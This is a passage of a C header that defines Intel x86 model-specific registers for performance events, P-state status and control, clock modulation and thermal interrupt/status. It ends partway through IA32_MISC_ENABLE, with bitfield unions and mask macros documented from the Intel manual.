#define IA32_PERFEVTSEL_INTR_BIT                                     20
#define IA32_PERFEVTSEL_INTR_FLAG                                    0x100000
#define IA32_PERFEVTSEL_INTR_MASK                                    0x01
#define IA32_PERFEVTSEL_INTR(_)                                      (((_) >> 20) & 0x01)

        /**
         * [Bit 21] When set to 1, it enables counting the associated event conditions occurring across all logical processors
         * sharing a processor core. When set to 0, the counter only increments the associated event conditions occurring in the
         * logical processor which programmed the MSR.
         */
        UINT64 AnyThread : 1;
#define IA32_PERFEVTSEL_ANY_THREAD_BIT                               21
#define IA32_PERFEVTSEL_ANY_THREAD_FLAG                              0x200000
#define IA32_PERFEVTSEL_ANY_THREAD_MASK                              0x01
#define IA32_PERFEVTSEL_ANY_THREAD(_)                                (((_) >> 21) & 0x01)

        /**
         * [Bit 22] Enables the corresponding performance counter to commence counting when this bit is set.
         */
        UINT64 En : 1;
#define IA32_PERFEVTSEL_EN_BIT                                       22
#define IA32_PERFEVTSEL_EN_FLAG                                      0x400000
#define IA32_PERFEVTSEL_EN_MASK                                      0x01
#define IA32_PERFEVTSEL_EN(_)                                        (((_) >> 22) & 0x01)

        /**
         * [Bit 23] Invert the CMASK.
         */
        UINT64 Inv : 1;
#define IA32_PERFEVTSEL_INV_BIT                                      23
#define IA32_PERFEVTSEL_INV_FLAG                                     0x800000
#define IA32_PERFEVTSEL_INV_MASK                                     0x01
#define IA32_PERFEVTSEL_INV(_)                                       (((_) >> 23) & 0x01)

        /**
         * [Bits 31:24] When CMASK is not zero, the corresponding performance counter increments each cycle if the event count is
         * greater than or equal to the CMASK.
         */
        UINT64 Cmask : 8;
#define IA32_PERFEVTSEL_CMASK_BIT                                    24
#define IA32_PERFEVTSEL_CMASK_FLAG                                   0xFF000000
#define IA32_PERFEVTSEL_CMASK_MASK                                   0xFF
#define IA32_PERFEVTSEL_CMASK(_)                                     (((_) >> 24) & 0xFF)
        UINT64 Reserved1 : 32;
    };

    UINT64 Flags;
} IA32_PERFEVTSEL_REGISTER;

/**
 * @}
 */


 /**
  * Current Performance Status.
  *
  * @remarks 0F_03H
  * @see Vol3B[14.1.1(Software Interface For Initiating Performance State Transitions)]
  */
#define IA32_PERF_STATUS                                             0x00000198
typedef union
{
    struct
    {
        /**
         * [Bits 15:0] Current performance State Value.
         */
        UINT64 StateValue : 16;
#define IA32_PERF_STATUS_STATE_VALUE_BIT                             0
#define IA32_PERF_STATUS_STATE_VALUE_FLAG                            0xFFFF
#define IA32_PERF_STATUS_STATE_VALUE_MASK                            0xFFFF
#define IA32_PERF_STATUS_STATE_VALUE(_)                              (((_) >> 0) & 0xFFFF)
        UINT64 Reserved1 : 48;
    };

    UINT64 Flags;
} IA32_PERF_STATUS_REGISTER;


/**
 * @brief Performance Control <b>(R/W)</b>
 *
 * Performance Control. Software makes a request for a new Performance state (P-State) by writing this MSR.
 *
 * @remarks 0F_03H
 * @see Vol3B[14.1.1(Software Interface For Initiating Performance State Transitions)]
 */
#define IA32_PERF_CTL                                                0x00000199
typedef union
{
    struct
    {
        /**
         * [Bits 15:0] Target performance State Value.
         */
        UINT64 TargetStateValue : 16;
#define IA32_PERF_CTL_TARGET_STATE_VALUE_BIT                         0
#define IA32_PERF_CTL_TARGET_STATE_VALUE_FLAG                        0xFFFF
#define IA32_PERF_CTL_TARGET_STATE_VALUE_MASK                        0xFFFF
#define IA32_PERF_CTL_TARGET_STATE_VALUE(_)                          (((_) >> 0) & 0xFFFF)
        UINT64 Reserved1 : 16;

        /**
         * [Bit 32] IDA Engage.
         *
         * @remarks 06_0FH (Mobile only)
         */
        UINT64 IdaEngage : 1;
#define IA32_PERF_CTL_IDA_ENGAGE_BIT                                 32
#define IA32_PERF_CTL_IDA_ENGAGE_FLAG                                0x100000000
#define IA32_PERF_CTL_IDA_ENGAGE_MASK                                0x01
#define IA32_PERF_CTL_IDA_ENGAGE(_)                                  (((_) >> 32) & 0x01)
        UINT64 Reserved2 : 31;
    };

    UINT64 Flags;
} IA32_PERF_CTL_REGISTER;


/**
 * Clock Modulation Control.
 *
 * @remarks If CPUID.01H:EDX[22] = 1
 * @see Vol3B[14.7.3(Software Controlled Clock Modulation)]
 */
#define IA32_CLOCK_MODULATION                                        0x0000019A
typedef union
{
    struct
    {
        /**
         * [Bit 0] Extended On-Demand Clock Modulation Duty Cycle.
         *
         * @remarks If CPUID.06H:EAX[5] = 1
         */
        UINT64 ExtendedOnDemandClockModulationDutyCycle : 1;
#define IA32_CLOCK_MODULATION_EXTENDED_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_BIT 0
#define IA32_CLOCK_MODULATION_EXTENDED_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_FLAG 0x01
#define IA32_CLOCK_MODULATION_EXTENDED_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_MASK 0x01
#define IA32_CLOCK_MODULATION_EXTENDED_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE(_) (((_) >> 0) & 0x01)

        /**
         * @brief On-Demand Clock Modulation Duty Cycle
         *
         * [Bits 3:1] On-Demand Clock Modulation Duty Cycle: Specific encoded values for target duty cycle modulation.
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 OnDemandClockModulationDutyCycle : 3;
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_BIT 1
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_FLAG 0x0E
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_MASK 0x07
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE(_) (((_) >> 1) & 0x07)

        /**
         * @brief On-Demand Clock Modulation Enable
         *
         * [Bit 4] On-Demand Clock Modulation Enable: Set 1 to enable modulation.
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 OnDemandClockModulationEnable : 1;
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_ENABLE_BIT  4
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_ENABLE_FLAG 0x10
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_ENABLE_MASK 0x01
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_ENABLE(_)   (((_) >> 4) & 0x01)
        UINT64 Reserved1 : 59;
    };

    UINT64 Flags;
} IA32_CLOCK_MODULATION_REGISTER;


/**
 * @brief Thermal Interrupt Control <b>(R/W)</b>
 *
 * Thermal Interrupt Control. Enables and disables the generation of an interrupt on temperature transitions detected with
 * the processor's thermal sensors and thermal monitor.
 *
 * @remarks If CPUID.01H:EDX[22] = 1
 * @see Vol3B[14.7.2(Thermal Monitor)]
 */
#define IA32_THERM_INTERRUPT                                         0x0000019B
typedef union
{
    struct
    {
        /**
         * [Bit 0] High-Temperature Interrupt Enable.
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 HighTemperatureInterruptEnable : 1;
#define IA32_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_BIT   0
#define IA32_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_FLAG  0x01
#define IA32_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_MASK  0x01
#define IA32_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE(_)    (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Low-Temperature Interrupt Enable.
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 LowTemperatureInterruptEnable : 1;
#define IA32_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_BIT    1
#define IA32_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_FLAG   0x02
#define IA32_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_MASK   0x01
#define IA32_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE(_)     (((_) >> 1) & 0x01)

        /**
         * [Bit 2] PROCHOT\# Interrupt Enable.
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 ProchotInterruptEnable : 1;
#define IA32_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_BIT            2
#define IA32_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_FLAG           0x04
#define IA32_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_MASK           0x01
#define IA32_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE(_)             (((_) >> 2) & 0x01)

        /**
         * [Bit 3] FORCEPR\# Interrupt Enable.
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 ForceprInterruptEnable : 1;
#define IA32_THERM_INTERRUPT_FORCEPR_INTERRUPT_ENABLE_BIT            3
#define IA32_THERM_INTERRUPT_FORCEPR_INTERRUPT_ENABLE_FLAG           0x08
#define IA32_THERM_INTERRUPT_FORCEPR_INTERRUPT_ENABLE_MASK           0x01
#define IA32_THERM_INTERRUPT_FORCEPR_INTERRUPT_ENABLE(_)             (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Critical Temperature Interrupt Enable.
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 CriticalTemperatureInterruptEnable : 1;
#define IA32_THERM_INTERRUPT_CRITICAL_TEMPERATURE_INTERRUPT_ENABLE_BIT 4
#define IA32_THERM_INTERRUPT_CRITICAL_TEMPERATURE_INTERRUPT_ENABLE_FLAG 0x10
#define IA32_THERM_INTERRUPT_CRITICAL_TEMPERATURE_INTERRUPT_ENABLE_MASK 0x01
#define IA32_THERM_INTERRUPT_CRITICAL_TEMPERATURE_INTERRUPT_ENABLE(_) (((_) >> 4) & 0x01)
        UINT64 Reserved1 : 3;

        /**
         * [Bits 14:8] Threshold \#1 Value
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 Threshold1Value : 7;
#define IA32_THERM_INTERRUPT_THRESHOLD1_VALUE_BIT                    8
#define IA32_THERM_INTERRUPT_THRESHOLD1_VALUE_FLAG                   0x7F00
#define IA32_THERM_INTERRUPT_THRESHOLD1_VALUE_MASK                   0x7F
#define IA32_THERM_INTERRUPT_THRESHOLD1_VALUE(_)                     (((_) >> 8) & 0x7F)

        /**
         * [Bit 15] Threshold \#1 Interrupt Enable.
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 Threshold1InterruptEnable : 1;
#define IA32_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_BIT         15
#define IA32_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_FLAG        0x8000
#define IA32_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_MASK        0x01
#define IA32_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE(_)          (((_) >> 15) & 0x01)

        /**
         * [Bits 22:16] Threshold \#2 Value.
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 Threshold2Value : 7;
#define IA32_THERM_INTERRUPT_THRESHOLD2_VALUE_BIT                    16
#define IA32_THERM_INTERRUPT_THRESHOLD2_VALUE_FLAG                   0x7F0000
#define IA32_THERM_INTERRUPT_THRESHOLD2_VALUE_MASK                   0x7F
#define IA32_THERM_INTERRUPT_THRESHOLD2_VALUE(_)                     (((_) >> 16) & 0x7F)

        /**
         * [Bit 23] Threshold \#2 Interrupt Enable.
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 Threshold2InterruptEnable : 1;
#define IA32_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_BIT         23
#define IA32_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_FLAG        0x800000
#define IA32_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_MASK        0x01
#define IA32_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE(_)          (((_) >> 23) & 0x01)

        /**
         * [Bit 24] Power Limit Notification Enable.
         *
         * @remarks If CPUID.06H:EAX[4] = 1
         */
        UINT64 PowerLimitNotificationEnable : 1;
#define IA32_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_BIT     24
#define IA32_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_FLAG    0x1000000
#define IA32_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_MASK    0x01
#define IA32_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE(_)      (((_) >> 24) & 0x01)
        UINT64 Reserved2 : 39;
    };

    UINT64 Flags;
} IA32_THERM_INTERRUPT_REGISTER;


/**
 * @brief Thermal Status Information <b>(RO)</b>
 *
 * Thermal Status Information. Contains status information about the processor's thermal sensor and automatic thermal
 * monitoring facilities.
 *
 * @remarks If CPUID.01H:EDX[22] = 1
 * @see Vol3B[14.7.2(Thermal Monitor)]
 */
#define IA32_THERM_STATUS                                            0x0000019C
typedef union
{
    struct
    {
        /**
         * [Bit 0] Thermal Status
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 ThermalStatus : 1;
#define IA32_THERM_STATUS_THERMAL_STATUS_BIT                         0
#define IA32_THERM_STATUS_THERMAL_STATUS_FLAG                        0x01
#define IA32_THERM_STATUS_THERMAL_STATUS_MASK                        0x01
#define IA32_THERM_STATUS_THERMAL_STATUS(_)                          (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Thermal Status Log
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 ThermalStatusLog : 1;
#define IA32_THERM_STATUS_THERMAL_STATUS_LOG_BIT                     1
#define IA32_THERM_STATUS_THERMAL_STATUS_LOG_FLAG                    0x02
#define IA32_THERM_STATUS_THERMAL_STATUS_LOG_MASK                    0x01
#define IA32_THERM_STATUS_THERMAL_STATUS_LOG(_)                      (((_) >> 1) & 0x01)

        /**
         * [Bit 2] PROCHOT \# or FORCEPR\# event
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 ProchotForceprEvent : 1;
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_EVENT_BIT                  2
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_EVENT_FLAG                 0x04
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_EVENT_MASK                 0x01
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_EVENT(_)                   (((_) >> 2) & 0x01)

        /**
         * [Bit 3] PROCHOT \# or FORCEPR\# log
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 ProchotForceprLog : 1;
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_LOG_BIT                    3
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_LOG_FLAG                   0x08
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_LOG_MASK                   0x01
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_LOG(_)                     (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Critical Temperature Status
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 CriticalTemperatureStatus : 1;
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_BIT            4
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_FLAG           0x10
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_MASK           0x01
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS(_)             (((_) >> 4) & 0x01)

        /**
         * [Bit 5] Critical Temperature Status log
         *
         * @remarks If CPUID.01H:EDX[22] = 1
         */
        UINT64 CriticalTemperatureStatusLog : 1;
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_BIT        5
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_FLAG       0x20
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_MASK       0x01
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG(_)         (((_) >> 5) & 0x01)

        /**
         * [Bit 6] Thermal Threshold \#1 Status
         *
         * @remarks If CPUID.01H:ECX[8] = 1
         */
        UINT64 ThermalThreshold1Status : 1;
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_BIT              6
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_FLAG             0x40
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_MASK             0x01
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_STATUS(_)               (((_) >> 6) & 0x01)

        /**
         * [Bit 7] Thermal Threshold \#1 log
         *
         * @remarks If CPUID.01H:ECX[8] = 1
         */
        UINT64 ThermalThreshold1Log : 1;
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_LOG_BIT                 7
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_LOG_FLAG                0x80
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_LOG_MASK                0x01
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_LOG(_)                  (((_) >> 7) & 0x01)

        /**
         * [Bit 8] Thermal Threshold \#2 Status
         *
         * @remarks If CPUID.01H:ECX[8] = 1
         */
        UINT64 ThermalThreshold2Status : 1;
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_BIT              8
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_FLAG             0x100
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_MASK             0x01
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_STATUS(_)               (((_) >> 8) & 0x01)

        /**
         * [Bit 9] Thermal Threshold \#2 log
         *
         * @remarks If CPUID.01H:ECX[8] = 1
         */
        UINT64 ThermalThreshold2Log : 1;
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_LOG_BIT                 9
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_LOG_FLAG                0x200
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_LOG_MASK                0x01
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_LOG(_)                  (((_) >> 9) & 0x01)

        /**
         * [Bit 10] Power Limitation Status
         *
         * @remarks If CPUID.06H:EAX[4] = 1
         */
        UINT64 PowerLimitationStatus : 1;
#define IA32_THERM_STATUS_POWER_LIMITATION_STATUS_BIT                10
#define IA32_THERM_STATUS_POWER_LIMITATION_STATUS_FLAG               0x400
#define IA32_THERM_STATUS_POWER_LIMITATION_STATUS_MASK               0x01
#define IA32_THERM_STATUS_POWER_LIMITATION_STATUS(_)                 (((_) >> 10) & 0x01)

        /**
         * [Bit 11] Power Limitation log
         *
         * @remarks If CPUID.06H:EAX[4] = 1
         */
        UINT64 PowerLimitationLog : 1;
#define IA32_THERM_STATUS_POWER_LIMITATION_LOG_BIT                   11
#define IA32_THERM_STATUS_POWER_LIMITATION_LOG_FLAG                  0x800
#define IA32_THERM_STATUS_POWER_LIMITATION_LOG_MASK                  0x01
#define IA32_THERM_STATUS_POWER_LIMITATION_LOG(_)                    (((_) >> 11) & 0x01)

        /**
         * [Bit 12] Current Limit Status
         *
         * @remarks If CPUID.06H:EAX[7] = 1
         */
        UINT64 CurrentLimitStatus : 1;
#define IA32_THERM_STATUS_CURRENT_LIMIT_STATUS_BIT                   12
#define IA32_THERM_STATUS_CURRENT_LIMIT_STATUS_FLAG                  0x1000
#define IA32_THERM_STATUS_CURRENT_LIMIT_STATUS_MASK                  0x01
#define IA32_THERM_STATUS_CURRENT_LIMIT_STATUS(_)                    (((_) >> 12) & 0x01)

        /**
         * [Bit 13] Current Limit log
         *
         * @remarks If CPUID.06H:EAX[7] = 1
         */
        UINT64 CurrentLimitLog : 1;
#define IA32_THERM_STATUS_CURRENT_LIMIT_LOG_BIT                      13
#define IA32_THERM_STATUS_CURRENT_LIMIT_LOG_FLAG                     0x2000
#define IA32_THERM_STATUS_CURRENT_LIMIT_LOG_MASK                     0x01
#define IA32_THERM_STATUS_CURRENT_LIMIT_LOG(_)                       (((_) >> 13) & 0x01)

        /**
         * [Bit 14] Cross Domain Limit Status
         *
         * @remarks If CPUID.06H:EAX[7] = 1
         */
        UINT64 CrossDomainLimitStatus : 1;
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_STATUS_BIT              14
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_STATUS_FLAG             0x4000
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_STATUS_MASK             0x01
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_STATUS(_)               (((_) >> 14) & 0x01)

        /**
         * [Bit 15] Cross Domain Limit log
         *
         * @remarks If CPUID.06H:EAX[7] = 1
         */
        UINT64 CrossDomainLimitLog : 1;
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_LOG_BIT                 15
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_LOG_FLAG                0x8000
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_LOG_MASK                0x01
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_LOG(_)                  (((_) >> 15) & 0x01)

        /**
         * [Bits 22:16] Digital Readout
         *
         * @remarks If CPUID.06H:EAX[0] = 1
         */
        UINT64 DigitalReadout : 7;
#define IA32_THERM_STATUS_DIGITAL_READOUT_BIT                        16
#define IA32_THERM_STATUS_DIGITAL_READOUT_FLAG                       0x7F0000
#define IA32_THERM_STATUS_DIGITAL_READOUT_MASK                       0x7F
#define IA32_THERM_STATUS_DIGITAL_READOUT(_)                         (((_) >> 16) & 0x7F)
        UINT64 Reserved1 : 4;

        /**
         * [Bits 30:27] Resolution in Degrees Celsius
         *
         * @remarks If CPUID.06H:EAX[0] = 1
         */
        UINT64 ResolutionInDegreesCelsius : 4;
#define IA32_THERM_STATUS_RESOLUTION_IN_DEGREES_CELSIUS_BIT          27
#define IA32_THERM_STATUS_RESOLUTION_IN_DEGREES_CELSIUS_FLAG         0x78000000
#define IA32_THERM_STATUS_RESOLUTION_IN_DEGREES_CELSIUS_MASK         0x0F
#define IA32_THERM_STATUS_RESOLUTION_IN_DEGREES_CELSIUS(_)           (((_) >> 27) & 0x0F)

        /**
         * [Bit 31] Reading Valid
         *
         * @remarks If CPUID.06H:EAX[0] = 1
         */
        UINT64 ReadingValid : 1;
#define IA32_THERM_STATUS_READING_VALID_BIT                          31
#define IA32_THERM_STATUS_READING_VALID_FLAG                         0x80000000
#define IA32_THERM_STATUS_READING_VALID_MASK                         0x01
#define IA32_THERM_STATUS_READING_VALID(_)                           (((_) >> 31) & 0x01)
        UINT64 Reserved2 : 32;
    };

    UINT64 Flags;
} IA32_THERM_STATUS_REGISTER;


/**
 * @brief Enable Misc. Processor Features <b>(R/W)</b>
 *
 * Allows a variety of processor functions to be enabled and disabled.
 */
#define IA32_MISC_ENABLE                                             0x000001A0
typedef union
{
    struct
    {
        /**
         * @brief Fast-Strings Enable
         *
         * [Bit 0] When set, the fast-strings feature (for REP MOVS and REP STORS) is enabled (default). When clear, fast-strings
         * are disabled.
         *
         * @remarks 0F_0H
         */
        UINT64 FastStringsEnable : 1;
#define IA32_MISC_ENABLE_FAST_STRINGS_ENABLE_BIT                     0
#define IA32_MISC_ENABLE_FAST_STRINGS_ENABLE_FLAG                    0x01
#define IA32_MISC_ENABLE_FAST_STRINGS_ENABLE_MASK                    0x01
#define IA32_MISC_ENABLE_FAST_STRINGS_ENABLE(_)                      (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 2;

        /**
         * @brief Automatic Thermal Control Circuit Enable <b>(R/W)</b>
         *
         * [Bit 3] - 1 = Setting this bit enables the thermal control circuit (TCC) portion of the Intel Thermal Monitor feature.
         * This allows the processor to automatically reduce power consumption in response to TCC activation.
         * - 0 = Disabled.
         *
         * @note In some products clearing this bit might be ignored in critical thermal conditions, and TM1, TM2 and adaptive
         *       thermal throttling will still be activated. The default value of this field varies with product.
         * @remarks 0F_0H
         */
        UINT64 AutomaticThermalControlCircuitEnable : 1;
#define IA32_MISC_ENABLE_AUTOMATIC_THERMAL_CONTROL_CIRCUIT_ENABLE_BIT 3
#define IA32_MISC_ENABLE_AUTOMATIC_THERMAL_CONTROL_CIRCUIT_ENABLE_FLAG 0x08
#define IA32_MISC_ENABLE_AUTOMATIC_THERMAL_CONTROL_CIRCUIT_ENABLE_MASK 0x01
#define IA32_MISC_ENABLE_AUTOMATIC_THERMAL_CONTROL_CIRCUIT_ENABLE(_) (((_) >> 3) & 0x01)
        UINT64 Reserved2 : 3;

        /**
         * @brief Performance Monitoring Available <b>(R)</b>
         *
         * [Bit 7] - 1 = Performance monitoring enabled.
         * - 0 = Performance monitoring disabled.
         *
         * @remarks 0F_0H
         */
        UINT64 PerformanceMonitoringAvailable : 1;
#define IA32_MISC_ENABLE_PERFORMANCE_MONITORING_AVAILABLE_BIT        7
#define IA32_MISC_ENABLE_PERFORMANCE_MONITORING_AVAILABLE_FLAG       0x80
#define IA32_MISC_ENABLE_PERFORMANCE_MONITORING_AVAILABLE_MASK       0x01
#define IA32_MISC_ENABLE_PERFORMANCE_MONITORING_AVAILABLE(_)         (((_) >> 7) & 0x01)
        UINT64 Reserved3 : 3;

        /**
         * @brief Branch Trace Storage Unavailable <b>(RO)</b>
         *
         * [Bit 11] - 1 = Processor doesn't support branch trace storage (BTS).
         * - 0 = BTS is supported.
         *
         * @remarks 0F_0H
         */
        UINT64 BranchTraceStorageUnavailable : 1;
#define IA32_MISC_ENABLE_BRANCH_TRACE_STORAGE_UNAVAILABLE_BIT        11
#define IA32_MISC_ENABLE_BRANCH_TRACE_STORAGE_UNAVAILABLE_FLAG       0x800
#define IA32_MISC_ENABLE_BRANCH_TRACE_STORAGE_UNAVAILABLE_MASK       0x01
#define IA32_MISC_ENABLE_BRANCH_TRACE_STORAGE_UNAVAILABLE(_)         (((_) >> 11) & 0x01)

        /**
         * @brief Processor Event Based Sampling (PEBS) Unavailable <b>(RO)</b>
         *
         * [Bit 12] - 1 = PEBS is not supported.
         * - 0 = PEBS is supported.
         *
         * @remarks 06_0FH
         */
        UINT64 ProcessorEventBasedSamplingUnavailable : 1;
#define IA32_MISC_ENABLE_PROCESSOR_EVENT_BASED_SAMPLING_UNAVAILABLE_BIT 12
#define IA32_MISC_ENABLE_PROCESSOR_EVENT_BASED_SAMPLING_UNAVAILABLE_FLAG 0x1000
#define IA32_MISC_ENABLE_PROCESSOR_EVENT_BASED_SAMPLING_UNAVAILABLE_MASK 0x01
#define IA32_MISC_ENABLE_PROCESSOR_EVENT_BASED_SAMPLING_UNAVAILABLE(_) (((_) >> 12) & 0x01)
        UINT64 Reserved4 : 3;

        /**
         * @brief Enhanced Intel SpeedStep Technology Enable <b>(R/W)</b>
         *
         * [Bit 16] - 0 = Enhanced Intel SpeedStep Technology disabled.
         * - 1 = Enhanced Intel SpeedStep Technology enabled.
         *
         * @remarks If CPUID.01H: ECX[7] = 1
         */
        UINT64 EnhancedIntelSpeedstepTechnologyEnable : 1;
#define IA32_MISC_ENABLE_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_ENABLE_BIT 16
#define IA32_MISC_ENABLE_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_ENABLE_FLAG 0x10000
#define IA32_MISC_ENABLE_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_ENABLE_MASK 0x01
#define IA32_MISC_ENABLE_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_ENABLE(_) (((_) >> 16) & 0x01)
        UINT64 Reserved5 : 1;

        /**
         * @brief ENABLE MONITOR FSM <b>(R/W)</b>
         *
         * [Bit 18] When this bit is set to 0, the MONITOR feature flag is not set (CPUID.01H:ECX[bit3] = 0). This indicates that
         * MONITOR/MWAIT are not supported. Software attempts to execute MONITOR/MWAIT will cause \#UD when this bit is 0.
         * When this bit is set to 1 (default), MONITOR/MWAIT are supported (CPUID.01H:ECX[bit 3] = 1). If the SSE3 feature flag
         * ECX[0] is not set (CPUID.01H:ECX[bit 0] = 0), the OS must not attempt to alter this bit. BIOS must leave it in the
         * default state. Writing this bit when the SSE3 feature flag is set to 0 may generate a \#GP exception.
         *
         * @remarks 0F_03H
         */
        UINT64 EnableMonitorFsm : 1;
#define IA32_MISC_ENABLE_ENABLE_MONITOR_FSM_BIT                      18
#define IA32_MISC_ENABLE_ENABLE_MONITOR_FSM_FLAG                     0x40000
#define IA32_MISC_ENABLE_ENABLE_MONITOR_FSM_MASK                     0x01
#define IA32_MISC_ENABLE_ENABLE_MONITOR_FSM(_)                       (((_) >> 18) & 0x01)
        UINT64 Reserved6 : 3;

        /**
         * @brief Limit CPUID Maxval <b>(R/W)</b>
         *
         * [Bit 22] When this bit is set to 1, CPUID.00H returns a maximum value in EAX[7:0] of 2. BIOS should contain a setup
         * question that allows users to specify when the installed OS does not support CPUID functions greater than 2.
         * Before setting this bit, BIOS must execute the CPUID.0H and examine the maximum value returned in EAX[7:0]. If the
         * maximum value is greater than 2, this bit is supported.
         * Otherwise, this bit is not supported. Setting this bit when the maximum value is not greater than 2 may generate a \#GP
         * exception. Setting this bit may cause unexpected behavior in software that depends on the availability of CPUID leaves
         * greater than 2.
         *
         * @remarks 0F_03H
         */
        UINT64 LimitCpuidMaxval : 1;
#define IA32_MISC_ENABLE_LIMIT_CPUID_MAXVAL_BIT                      22
#define IA32_MISC_ENABLE_LIMIT_CPUID_MAXVAL_FLAG                     0x400000
#define IA32_MISC_ENABLE_LIMIT_CPUID_MAXVAL_MASK                     0x01
